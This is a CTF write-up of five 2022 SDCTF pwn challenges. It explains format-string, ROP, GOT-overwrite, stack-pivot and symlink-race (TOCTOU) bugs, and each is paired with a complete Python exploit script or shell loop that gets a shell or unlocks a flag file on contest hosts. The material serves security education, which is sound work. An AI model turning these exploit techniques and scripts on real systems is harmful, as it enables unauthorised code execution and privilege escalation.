# 2022-Sdctf-All-Pwn-Wp




> I was shocked  when I found  I stayed in a only-me team. Where are my teammates?
>
> Anyway, I have completed all the tasks of pwn in a afternoon. These tasks are not very hard, and it takes me about `4` hours. In fact, I have spent almost `2` hours on solving `shamav`, this task is a little bit challengeable and interesting.



<!--more-->



##  Oil Spill

### checksec

![image-20220508210905962](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508210905962.png)

No relro and no pie, the remote glibc version is `libc6_2.27-3ubuntu1.5_amd64`.

### vulnerability

Glibc address is given, then, we can use printf attack:

![image-20220508210726488](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508210726488.png)



### solution

It's an easy task about `fmt-attack`. However, I had a problem when I used my `exp.py` to attack remote host. The problem is that I cannot get any output from the remote host. After I input something, I get the address of `puts/printf/temp` and then, the program in remote host is stopped. That means I cannot get glibc address before I input.......Maybe it's caused by my proxy VPN app.

In order to solve the problem, I decide to find a way to execute the `main` function again. The `.fini_array` section is chosen and I plan to replace `.fini_array[0]` with `main` address. Unfortunately, the address of `.fini_array` is `0x600A40`, which contains `\x0a`. WTF!!!!

Then, I try to use `partial overwritting` to do `rop`， and I found that there's a gadget  `add rsp, 0x38; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;` nearby puts@glibc.

```
0x0000000000080344: add rsp, 0x38; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
000000000000080970   512 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.2.5
```

To guess half a byte of the gadget, and use `fmt-attack` to modify the lowest `2` bytes of `puts@got`. then make use of `magic gadget` to change `printf@got` to `one gadget` and call printf to get shell.

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

set_remote_libc("./libc-2.27.so")

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

# offset 8
magic = 0x400658
pop_rbx = 0x4007DA

write_num = 10099 # 0x0000000000080773: add rsp, 0x48; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
printf_off = 0x64f70
og_off = 0x4f432

if gift.remote:
    write_num = 9028
    printf_off = 0x64e40
    og_off = 0x4f302

data = flat_z({
    0:{
        0: f"%{write_num}c%40$hn",
        80: [
            0x400772,
            0x400772, # ret
            pop_rbx,
            0x100000000 + og_off - printf_off, # printf,
            0x600c20 + 0x3d,
            0, 0, 0, 0,
            magic,
            0x400588, #printf
        ]
        },
    }, length=0x100) + p64_ex(0x600c18) # puts

sleep(1)
sl(data)

m = rls("0x").split(b",")
libc_base = int16_ex(m[0]) - libc.sym.puts
log_address("libc_base", libc_base)

if (libc_base & 0xffff) == 0x2000:
    log_ex_highlight("get shell!")
    sl("cat flag.txt")
    ia()
else:
    ic()
```

use command :  `for i in $(seq 1  8); do ./exp.py re ./OilSpill oil.sdc.tf:1337 -nl; done` to enumerate and get shell.

![image-20220508213922905](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508213922905.png)

## Horoscope

A basic rop task

### vulnerability

![image-20220508215543397](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508215543397.png)

and there are two functions to help you get shell:

![image-20220508215628900](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508215628900.png)

![image-20220508215638710](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508215638710.png)

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']

sl(flat({
    0: "1/1/1/1/",
    8: {
        48: [
            elf.sym.debug,
            elf.sym.test
        ]
    }
}))

r()
sl("cat flag.txt")

ia()
```

attack remote host:

![image-20220508215730626](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508215730626.png)

## BreakfastMenu

Heap related, maybe.

### checksec

![image-20220508215815359](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508215815359.png)

The remote glibc version is also `libc6_2.27-3ubuntu1.5_amd64`.

### vulnerability

The `idx` could be a negative number, I call it as `int overflow`:

![image-20220508215935838](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508215935838.png)

### solution

The steps:

- create a new order

- use `int overflow` to replace `got@free` with `puts@plt` and replace `exit@got` with `malloc@got`
- use `int overflow` to delete an order related `malloc@got`, actually, it leaks the real address of `malloc` function
- use `int overflow` to modify `free@got` to `system`, which is gained by the address of `malloc`
- delete an order with `/bin/sh` to get shell   

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

set_remote_libc("./libc-2.27.so")

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

def create():
    sla("4. Pay your bill and leave\n", "1")
    ru("A new order has been created\n")


def edit(i, data):
    sla("4. Pay your bill and leave\n", "2")
    sla("which order would you like to modify\n", str(i))
    sla("What would you like to order?\n", data)

def dele(i):
    sla("4. Pay your bill and leave\n", "3")
    sla("which order would you like to remove\n", str(i))


create()
edit(0, "/bin/sh")

edit(-7, p64(elf.plt.puts) + p64(elf.got.free))
edit(-7, p64(elf.got.malloc) + p64(elf.got.exit))

dele(-15)
libc_base = recv_current_libc_addr(offset=libc.sym.malloc)
set_current_libc_base_and_log(libc_base)

edit(-7, p64(libc.sym.system) + p64(elf.got.free))

dele(0)

ia()
```

![image-20220508220506836](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508220506836.png)

## Secure Horoscope

Still a basic rop challenge...

### vulnerability

A buffer overflow with `0x1c` bytes:

![image-20220508220624949](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508220624949.png)



### solution

I found a fast solution after reading the asm code of this program:

![image-20220508220750354](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508220750354.png)

When `rbp` is hijacked, we can write data anywhere.

The steps:

- buffer overflow and to control `rbp`
- write rop chain in the `bss` section and do stack pivot
- rop and use magic gadget to get shell

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

sla("To get started, tell us how you feel\n", "great")
sa("we will have your very own horoscope\n\n", flat({
    0x70: [
        elf.bss(0x470),
        0x4007cf
    ]
}, length=0x8c))
sleep(1)
CurrentGadgets.set_find_area(find_in_libc=False)
s(flat_z({
    0: [
        elf.bss(0x470),
        CurrentGadgets.write_by_magic(elf.got.puts, libc.sym.puts, get_current_one_gadget_from_libc()[1]),
        elf.plt.puts
    ],
    0x70: [
        elf.bss(0x400),
        0x40080D
    ]
}, length=0x8c))

ia()
```

![image-20220508221234264](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508221234264.png)

## ShamAV

It's about `toutoc` vuln, that is **time of use time of change/check**. Soft symbol link attack is used in this challenge.

Tips: `shutil.copyfile(src, dst)` will raise an exception if `src` is  not readable; If `dst` already exists, it will be replaced.

### analysis of server

Download the `server.py`:

```
#! /usr/bin/env python3                                                                                                                                                                                 [40/1990]import base64, socket, os, hashlib, shutil, sys
import base64, socket, os, hashlib, shutil, sys

USER_UID = 1002
CTR_LENGTH = 256
STDIO_DEBUG = False

ctr = 0
malware_hashes = set()

with open('malware-hashes.txt') as f:
    for line in f:
        malware_hashes.add(line.strip())

with open('seed') as f:
    seed = base64.b64decode(f.read())
    # Read from a seed file to make the behavior more reproduce-able
    # Make testing a lot easier

def log(s: str):
    print(s, file=sys.stderr, flush=True)

def genrandom():
    global ctr
    result = hashlib.sha256(ctr.to_bytes(CTR_LENGTH, byteorder='little') + seed).hexdigest()
    ctr += 1
    return result

def is_malware(file: str):
    with open(file, 'rb') as f:
        return hashlib.sha256(f.read()).hexdigest() in malware_hashes

def _scan(path: str):
    log(f'[I] Scanning file {path}')
    try:
        if os.lstat(path).st_uid != USER_UID:
            return "You do not have permission to scan this item"
    except OSError as e:
        return f'Error from OS: {e}'
    target_path = f'/home/antivirus/quarantine/sham-av-{genrandom()}'
    log(f'[D] Copying file from {path} to {target_path}')
    try:
        shutil.copyfile(path, target_path)
        if is_malware(target_path):
            log(f'[I] Found malware at {path}')
            return f'***** Malware detected! File quarantined at {target_path} *****'
    except IsADirectoryError as e:
        return f'An error occurred: {e}'
    return "File scan completed. No malware detected."

def scan(path: str):
    res = _scan(path)
    log(f'[I] Scan complete: {path}')
    return res

SOCKET_FILE = 'socket'
BS = 4096

def recvall(sock):
    chunks = []
    while True:
        chunk = sock.recv(BS)
        if chunk == b'':
            return b''.join(chunks)
        chunks.append(chunk)

while True:
    if STDIO_DEBUG:
        try:
            path = input()
        except EOFError:
            break
        print(f'Scan result: {scan(path)}')
    else:
        with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as s:
            try:
                os.unlink(SOCKET_FILE)
            except FileNotFoundError:
                pass
            s.bind(SOCKET_FILE)
            os.chmod(SOCKET_FILE, 0o777)
            s.listen()
            while True:
                log(f'[I] Ready for the next client')
                conn, _ = s.accept()
                res = scan(recvall(conn).decode(errors='surrogateescape'))
                log(f'[I] Scan result: {res}')
                try:
                    conn.sendall(res.encode())
                except OSError as e:
                    log(f'[E] OS error on sendall: {e}')
```

and the `launch.sh`:

```shell
#! /usr/bin/env bash

set -e

cd "$(dirname -- "${BASH_SOURCE[0]}")"

function main {
    echo "----- Welcome to ShamAV, version alpha 0.0.1 -----"
    echo "***** Begin System information *****"
    echo "Working directory: $(pwd)"
    echo "Directory listing:"
    ls -la
    echo "***** End System information *****"

    while true; do
        ( umask 077; head -c 32 /dev/urandom | base64 > seed )
        if ./server.py 2>&1; then
            echo "[I] Launcher shutting down..."
            break
        fi
        echo "[!] ShamAV server has crashed, restarting in 1 second..."
        sleep 1
        echo "[I] Restarting ShamAV server"
    done
}

main > av.log
```



The vuln is in `_scan` method:

```python
def _scan(path: str):
    log(f'[I] Scanning file {path}')
    try:
        if os.lstat(path).st_uid != USER_UID: # check
            return "You do not have permission to scan this item"
    except OSError as e:
        return f'Error from OS: {e}'
    target_path = f'/home/antivirus/quarantine/sham-av-{genrandom()}'
    log(f'[D] Copying file from {path} to {target_path}')
    try:
        shutil.copyfile(path, target_path) # used
```

We can create a file which belongs to `ctf` to bypass the check of `USER_UID`, then remove the file and create a symbol link to `/home/antivirus/seed` with the same name instantly. In a lucky moment, the `/home/antivirus/seed`file is copied to `/home/antivirus/quarantine`, so we can read the content of `seed` and get its data. 

Once we get `seed`, we can generate and forecast all the next `sha-256` digest values using `genrandom` method in `server.py`.

### solution

The steps:

- use symbol link attack to leak seed data and calculate the next `sha-256` hash values
- create many soft symbol links in `/home/antivirus/quarantine`  with the format `/home/antivirus/quarantine/sham-av-{known-digest-value}`, all of these links point to `/home/antivirus/server.py`

- create a file `/home/ctf/server.py`, with content:

  ```python
  #!/usr/bin/env python3
  import os
  os.system('chmod 777 /home/antivirus/flag.txt')
  ```

- execute `/home/ctf/bin/scan /home/ctf/server.py` to replace the `/home/antivirus/server.py` with `/home/ctf/server.py`

- remove all file in `/home/antivirus/quarantine`

- try to `toctou` attack `/home/antivirus/flag.txt` and in a moment, an exception is raised when  `shutil.copyfile` is called, because  the parameter `src` which point to `/home/antivirus/flag.txt` is not readable

- `launch.sh` would execute `./server.py` again, but the file has been replaced, so `os.system(chmod 777 flag.txt)` is executed

### EXP

First, use following command to create three bash scripts:

```shell
echo -e '#!/bin/sh\nwhile true; do rm -rf /home/ctf/flag;touch /home/ctf/flag;rm -rf /home/ctf/flag;ln -s /home/antivirus/seed /home/ctf/flag;sleep 0.1; done' > exp1.sh && echo -e '#!/bin/sh\nwhile true; do rm -rf /home/ctf/flag;touch /home/ctf/flag;rm -rf /home/ctf/flag;ln -s /home/antivirus/flag.txt /home/ctf/flag; done' > exp2.sh && echo -e '#!/bin/sh\nwhile true; do /home/ctf/bin/scan /home/ctf/flag; done' > attack.sh && chmod +x *.sh
```

Then, execute:

```bash
timeout 60 ./exp1.sh &
timeout 60 ./attack.sh
```

Now, the seed file has been copied to `/home/antivirus/quarantine`, create a symbol link `/home/ctf/seed` to point to the seed file in `/home/antivirus/quarantine`

Use `base64` to write `go.py`：

```python
import base64, hashlib, os
ctr = 0
CTR_LENGTH = 256

with open('seed') as f:
    seed = base64.b64decode(f.read())

def genrandom():
    global ctr
    result = hashlib.sha256(ctr.to_bytes(CTR_LENGTH, byteorder='little') + seed).hexdigest()
    ctr += 1
    return result

data = """#! /usr/bin/env python3
import os
os.system("chmod 777 /home/antivirus/flag.txt")
"""

with open("/home/ctf/server.py", "wt", encoding='utf-8') as f:
    f.write(data.replace("\r\n", "\n"))
    f.flush()

os.system("chmod +x /home/ctf/server.py")

for i in range(0x200):
    filepath = f'/home/antivirus/quarantine/sham-av-{genrandom()}'
    if not os.path.exists(filepath):
        os.system(f"ln -s /home/antivirus/server.py {filepath}")

# replace server.py
os.system("/home/ctf/bin/scan /home/ctf/server.py")

# remove all files
os.system("rm -rf /home/antivirus/quarantine/*")

# check
os.system("ls -al /home/antivirus/quarantine")
os.system("ls -al /home/antivirus/server.py")
```

  And, execute command: 

```bash
cat > tmp << EOF
aW1wb3J0IGJhc2U2NCwgaGFzaGxpYiwgb3MKY3RyID0gMApDVFJfTEVOR1RIID0gMjU2Cgp3aXRo
IG9wZW4oJ3NlZWQnKSBhcyBmOgogICAgc2VlZCA9IGJhc2U2NC5iNjRkZWNvZGUoZi5yZWFkKCkp
CgpkZWYgZ2VucmFuZG9tKCk6CiAgICBnbG9iYWwgY3RyCiAgICByZXN1bHQgPSBoYXNobGliLnNo
YTI1NihjdHIudG9fYnl0ZXMoQ1RSX0xFTkdUSCwgYnl0ZW9yZGVyPSdsaXR0bGUnKSArIHNlZWQp
LmhleGRpZ2VzdCgpCiAgICBjdHIgKz0gMQogICAgcmV0dXJuIHJlc3VsdAoKZGF0YSA9ICIiIiMh
IC91c3IvYmluL2VudiBweXRob24zCmltcG9ydCBvcwpvcy5zeXN0ZW0oImNobW9kIDc3NyAvaG9t
ZS9hbnRpdmlydXMvZmxhZy50eHQiKQoiIiIKCndpdGggb3BlbigiL2hvbWUvY3RmL3NlcnZlci5w
eSIsICJ3dCIsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6CiAgICBmLndyaXRlKGRhdGEucmVwbGFj
ZSgiXHJcbiIsICJcbiIpKQogICAgZi5mbHVzaCgpCgpvcy5zeXN0ZW0oImNobW9kICt4IC9ob21l
L2N0Zi9zZXJ2ZXIucHkiKQoKZm9yIGkgaW4gcmFuZ2UoMHgyMDApOgogICAgZmlsZXBhdGggPSBm
Jy9ob21lL2FudGl2aXJ1cy9xdWFyYW50aW5lL3NoYW0tYXYte2dlbnJhbmRvbSgpfScKICAgIGlm
IG5vdCBvcy5wYXRoLmV4aXN0cyhmaWxlcGF0aCk6CiAgICAgICAgb3Muc3lzdGVtKGYibG4gLXMg
L2hvbWUvYW50aXZpcnVzL3NlcnZlci5weSB7ZmlsZXBhdGh9IikKCiMgcmVwbGFjZSBzZXJ2ZXIu
cHkKb3Muc3lzdGVtKCIvaG9tZS9jdGYvYmluL3NjYW4gL2hvbWUvY3RmL3NlcnZlci5weSIpCgpv
cy5zeXN0ZW0oInJtIC1yZiAvaG9tZS9hbnRpdmlydXMvcXVhcmFudGluZS8qIikKCiMgY2hlY2sK
b3Muc3lzdGVtKCJscyAtYWwgL2hvbWUvYW50aXZpcnVzL3F1YXJhbnRpbmUiKQpvcy5zeXN0ZW0o
ImxzIC1hbCAvaG9tZS9hbnRpdmlydXMvc2VydmVyLnB5Iik=
EOF

base64 -d tmp > go.py
python3 go.py
```

Finally:

```shell
./exp2.sh &
timeout 60 ./attack.sh
```

If you're a lucky boy, you will find the `/home/antivirus/flag.txt` is `rwxrwxrwx`, now, capture the flag:



![image-20220508223638363](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508223638363.png)

## reference

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)


---

> Author: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/2022-sdctf-all-pwn-wp/  

